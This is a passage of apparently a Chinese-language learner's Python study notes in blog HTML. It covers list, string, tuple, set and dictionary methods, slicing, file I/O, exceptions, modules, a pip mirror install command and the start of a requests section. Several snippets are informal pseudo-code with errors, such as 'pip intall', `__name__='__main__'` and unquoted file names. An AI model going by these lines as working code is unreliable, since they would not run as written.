class="code"><pre><span class="line"><span class="comment">##查询</span></span><br><span class="line"><span class="comment">#######查找一个元素,并返回他的下标###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">54</span>,<span class="number">645</span>,<span class="number">7</span>,<span class="number">54</span>,<span class="number">1</span>]</span><br><span class="line">index=mylist.index(<span class="number">645</span>)</span><br><span class="line"><span class="built_in">print</span>(index)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##统计</span></span><br><span class="line"><span class="comment">#######统计一个元素在列表中出现的次数###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">54</span>,<span class="number">645</span>,<span class="number">7</span>,<span class="number">54</span>,<span class="number">1</span>]</span><br><span class="line">count=mylist.count(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##清空</span></span><br><span class="line"><span class="comment">#######清空列表###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">213125435423</span>,<span class="number">541542354235</span>]</span><br><span class="line">mylist.clear()</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##求列表大小</span></span><br><span class="line"><span class="comment">#######求列表大小(返回数组有多少个元素)###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">123123455435</span>,<span class="number">456453</span>,<span class="number">67345</span>,<span class="number">67</span>,<span class="number">546</span>,<span class="number">543</span>,<span class="number">6543</span>]</span><br><span class="line"><span class="built_in">len</span>=<span class="built_in">len</span>(mylist)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">my_str=(<span class="string">&quot;YYSSH&quot;</span>)</span><br><span class="line">y=my_str[<span class="number">0</span>]</span><br><span class="line">h=my_str[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y&#125;</span>,<span class="subst">&#123;h&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######### 查找</span></span><br><span class="line">index=my_str.index(<span class="string">&quot;S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############ 替换</span></span><br><span class="line">replace=my_str.replace(<span class="string">&quot;YY&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;replace&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############ 用split切割字符串，并且用一个列表进行存储</span></span><br><span class="line">split=my_str.split()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;split&#125;</span>,<span class="subst">&#123;<span class="built_in">type</span>(split)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#############  strip 若括号里面不添加内容，则默认去除行首和行尾的空格和换行符</span></span><br><span class="line">my_str=(<span class="string">&quot;   YYSSH    &quot;</span>)</span><br><span class="line">strip=my_str.strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;strip&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_str=(<span class="string">&quot;78 YYSSH 87&quot;</span>)</span><br><span class="line">strip=my_str.strip(<span class="string">&quot;78&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;strip&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串也有count和len函数</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Y,H</span><br><span class="line">2</span><br><span class="line">yySSH</span><br><span class="line">[&#x27;YYSSH&#x27;],&lt;class &#x27;list&#x27;&gt;</span><br><span class="line">YYSSH</span><br><span class="line"> YYSSH </span><br></pre></td></tr></table></figure><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###########定义元组  :元组不可以被修改 tuple</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"></span><br><span class="line">t =(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="number">577</span>,<span class="string">&quot;jianjian&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################ 跟list一样 都可以使用 index count len</span></span><br><span class="line">index = t.index(<span class="number">577</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">tc= t.count(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;tc&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">len</span> =<span class="built_in">len</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############# 元组元素不可以被修改（自我猜测应该是记录了元素的首地址），但是元素的元素可以被修改 e.g.（元组里面有个列表）</span></span><br><span class="line"></span><br><span class="line">t2=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">t2[<span class="number">6</span>][<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;t2&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1, 1, 1, 1, 1, 1, 23, 577, &#x27;jianjian&#x27;)</span><br><span class="line">7</span><br><span class="line">6</span><br><span class="line">9</span><br><span class="line">(1, 2, 3, 4, 5, 6, [0, 2, 3])</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;序列 连续、有序、支持下标索引 e.g.(列表、元组、字符串)&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">my_list=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">result1=my_list[::]      <span class="comment">######### 三个空格默认分别为 行首、行尾、步长为1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_tuple=(<span class="string">&quot;YYSSH&quot;</span>,<span class="string">&quot;yyssh&quot;</span>,<span class="string">&quot;YYssh&quot;</span>,<span class="string">&quot;yuya&quot;</span>,<span class="string">&quot;ioio&quot;</span>)</span><br><span class="line">result2=my_tuple[<span class="number">1</span>:<span class="number">4</span>:<span class="number">1</span>]    <span class="comment">#####如果不使用默认的空格表示，则不会表示步长最后一个数</span></span><br><span class="line">result3=my_tuple[::-<span class="number">1</span>]     <span class="comment">#####若表明步长为-1，则默认从行尾到行首</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result2&#125;</span>,<span class="subst">&#123;result3&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_str=(<span class="string">&quot;YySsH&quot;</span>)</span><br><span class="line">result4=my_str[::<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result4&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5, 6, 7]</span><br><span class="line">(&#x27;yyssh&#x27;, &#x27;YYssh&#x27;, &#x27;yuya&#x27;),(&#x27;ioio&#x27;, &#x27;yuya&#x27;, &#x27;YYssh&#x27;, &#x27;yyssh&#x27;, &#x27;YYSSH&#x27;)</span><br><span class="line">YSH</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#练习案例：序列的切片实践</span><br><span class="line">my_str1=(&quot;学python,来黑马程序员,月薪过万&quot;)</span><br><span class="line">my_str=my_str1[::-1]</span><br><span class="line">print(f&quot;&#123;type(my_str)&#125;&quot;)</span><br><span class="line">split=my_str.split(&quot;,&quot;)</span><br><span class="line">print(f&quot;&#123;split&#125;&quot;)</span><br><span class="line">split2=split[1]</span><br><span class="line">strip=split2.strip(&quot;来&quot;)</span><br><span class="line">print(f&quot;&#123;strip&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;strip[::-1]&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">[&#x27;万过薪月&#x27;, &#x27;员序程马黑来&#x27;, &#x27;nohtyp学&#x27;]</span><br><span class="line">员序程马黑</span><br><span class="line">黑马程序员</span><br></pre></td></tr></table></figure><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############  集合 无序、所以不支持下标索引和while循环遍历 去重、集合里面不允许有重复的数据存在</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义一个空集合</span></span><br><span class="line">SET=<span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;SET&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_set=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加一个集合元素</span></span><br><span class="line">my_set.add(<span class="string">&quot;yan&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 移除一个集合元素</span></span><br><span class="line">my_set.remove(<span class="string">&quot;yan&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 取出第一个元素</span></span><br><span class="line">pop=my_set.pop()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 清空集合</span></span><br><span class="line">my_set.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 取集合1相比集合2的差集，集合1、2都不变，生成一个新的集合</span></span><br><span class="line">my_set=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">my_set2=&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">different=my_set.difference(my_set2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;different&#125;</span>,<span class="subst">&#123;my_set&#125;</span>,<span class="subst">&#123;my_set2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 去除集合1与集合2相同的部分，保留不同的部分</span></span><br><span class="line">my_set.difference_update(my_set2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set&#125;</span>,<span class="subst">&#123;my_set2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 合并两个集合</span></span><br><span class="line">my_set3=my_set.union(my_set2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_set3&#125;</span>,<span class="subst">&#123;my_set&#125;</span>,<span class="subst">&#123;my_set2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 集合也有len函数</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set()</span><br><span class="line">&#123;1, 34, 3, 5, 6, 7&#125;</span><br><span class="line">&#123;1, 34, 3, 5, 6, 7, &#x27;yan&#x27;&#125;</span><br><span class="line">&#123;1, 34, 3, 5, 6, 7&#125;</span><br><span class="line">&#123;34, 3, 5, 6, 7&#125;</span><br><span class="line">set()</span><br><span class="line">&#123;1&#125;,&#123;1, 2, 3, 4&#125;,&#123;2, 3, 4, 5&#125;</span><br><span class="line">&#123;1&#125;,&#123;2, 3, 4, 5&#125;</span><br><span class="line">&#123;1, 2, 3, 4, 5&#125;,&#123;1&#125;,&#123;2, 3, 4, 5&#125;</span><br></pre></td></tr></table></figure><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义字典</span></span><br><span class="line"><span class="comment"># &#123;key:value,key:value,.....,key:value&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义字典变量</span></span><br><span class="line"><span class="comment"># my_dict=&#123;key:value,key:value&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义空字典</span></span><br><span class="line"><span class="comment"># my_dict=&#123;&#125;</span></span><br><span class="line"><span class="comment"># my_dict=dict()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义重复key值的话，新的key值会把老的key值给覆盖，</span></span><br><span class="line"><span class="comment"># 嵌套字典的话key值不可以为字典，但是value可以为字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增元素</span></span><br><span class="line"><span class="comment"># my_dict[&quot;新增的元素&quot;]=你要赋的value值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除元素</span></span><br><span class="line"><span class="comment"># my_dict.pop(&quot;删除的元素&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空元素</span></span><br><span class="line"><span class="comment"># my_dict.clear()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取全部的key</span></span><br><span class="line">my_dict=&#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">23</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">2</span>&#125;</span><br><span class="line">keys=my_dict.keys()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字典</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_dict[key]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;my_dict[key]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="容器的不同"><a href="#容器的不同" class="headerlink" title="容器的不同"></a>容器的不同</h3><p>&#x3D;&#x3D;都支持len\max\min\sorted(序列,[reverse&#x3D;True])&#x3D;&#x3D;</p><p>&#x3D;&#x3D;使用sorted函数之后容器会变成列表&#x3D;&#x3D;</p><p>&#x3D;&#x3D;字典转序列除了字符串，其他都会丢失值&#x3D;&#x3D;</p><p><img src="D:\python_learn\Python_image\容器的不同.png" alt="image-20241113202258253"></p><h3 id="字符串的比较"><a href="#字符串的比较" class="headerlink" title="字符串的比较"></a>字符串的比较</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ascii码表一位一位比较，只要前面有一位比后面大，整体就大</span><br></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(name,mode,encoding)</span><br><span class="line"><span class="comment">#name是要打开文件名（可以包含文件所在的具体路径）</span></span><br><span class="line"><span class="comment">#mode设置文件打开的模式（访问模式）：只读、写入、追加等</span></span><br><span class="line"><span class="comment">#encoding编码格式（大多用UTF-8）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,mode,encoding) <span class="keyword">as</span> f:<span class="comment">#会自动帮我们关闭文件</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(python.md,<span class="string">&#x27;r&#x27;</span>,encoding=UTF-<span class="number">8</span>)</span><br><span class="line"><span class="comment">#r:read读取文件，文件指针放在文件开头</span></span><br><span class="line"><span class="comment">#w:write写入文件，默认删除原本文件内容，没有文件则新建文件</span></span><br><span class="line"><span class="comment">#a:add追加文件内容，没有文件新建文件</span></span><br><span class="line">f.read(读取文件字节数)<span class="comment">#默认不写则为num，即是所有字节</span></span><br><span class="line">f.read(<span class="number">10</span>)<span class="comment">#会从本次代码中上一次read读取末尾进行读取，也就是文件读取指针发生了偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在本次代码中文件读取指针对整个文件有影响，也就是不论函数，指针已经发生了偏移</span></span><br><span class="line"></span><br><span class="line">f.readlines()<span class="comment">#读取文件一行内容，并以列表的模式返回，</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h4 id="循环读取文件数据"><a href="#循环读取文件数据" class="headerlink" title="循环读取文件数据"></a>循环读取文件数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;python.txt&quot;</span>,<span class="string">&quot;r&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line"><span class="comment">#line是临时数据，记录文件一行数据，line的类型是字符串</span></span><br></pre></td></tr></table></figure><h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(python.md,<span class="string">&#x27;w&#x27;</span>,encoding=UTF-<span class="number">8</span>)</span><br><span class="line">f.write(<span class="number">111</span>)<span class="comment">#这行代码执行完之后还没有把内容写入硬盘文件中，而是写入到了内存中，防止重复调用硬盘</span></span><br><span class="line">f.flush()<span class="comment">#把内容写入硬盘中</span></span><br><span class="line">f.close()<span class="comment">#这个函数自带了flush功能</span></span><br></pre></td></tr></table></figure><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">可能发生错误的代码</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;NULL.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>)//因为没有这个文件所以无法读取发生报错</span><br><span class="line"><span class="keyword">except</span>：</span><br><span class="line">发生错误之后的处理</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;NULL.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>)//所以改成写入文件即创建这个文件</span><br><span class="line"><span class="keyword">except</span> (NameError,ZeroDivisionError) <span class="keyword">as</span> e(用e这个变量接收)://捕获指定的异常、</span><br><span class="line"><span class="built_in">print</span>(e)//打印这个异常的具体信息</span><br><span class="line"><span class="keyword">else</span>://如果没有异常</span><br><span class="line"><span class="keyword">finally</span>://最终执行代码，不论上述代码执行成不成功</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e://等于<span class="keyword">except</span>接收所有异常</span><br></pre></td></tr></table></figure><p><strong>异常可以传递</strong></p><h3 id="Python模块"><a href="#Python模块" class="headerlink" title="Python模块"></a>Python模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[]:表示可选</span><br><span class="line">[<span class="keyword">from</span> 模块名] <span class="keyword">import</span> [模块|类|变量|函数|*][<span class="keyword">as</span> 别名]</span><br><span class="line"></span><br><span class="line">如果调用模块的函数名一样的话，会使用后面那个函数</span><br><span class="line"></span><br><span class="line">不进行调用模块的测试代码</span><br><span class="line"><span class="keyword">if</span> __name__=<span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">测试代码</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> 模块名 <span class="keyword">import</span> *//可以手动导入没有被<span class="built_in">all</span>的函数</span><br><span class="line">如果模块里面定义了__all__==[<span class="string">&#x27;执行函数&#x27;</span>]，则只能引入执行函数//因为*===__all__</span><br></pre></td></tr></table></figure><h3 id="pip国内网站源安装包"><a href="#pip国内网站源安装包" class="headerlink" title="pip国内网站源安装包"></a>pip国内网站源安装包</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip intall -i https://pypi.tuna.tsinghua.edu.cn/simple 安装包名</span><br></pre></td></tr></table></figure><h3 id="python服务请求"><a href="#python服务请求" class="headerlink" title="python服务请求"></a>python服务请求</h3><h5 id="requests-post-requests-get"><a href="#requests-post-requests-get" class="headerlink" title="requests.post&#x2F;requests.get"></a>requests.post&#x2F;requests.get</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 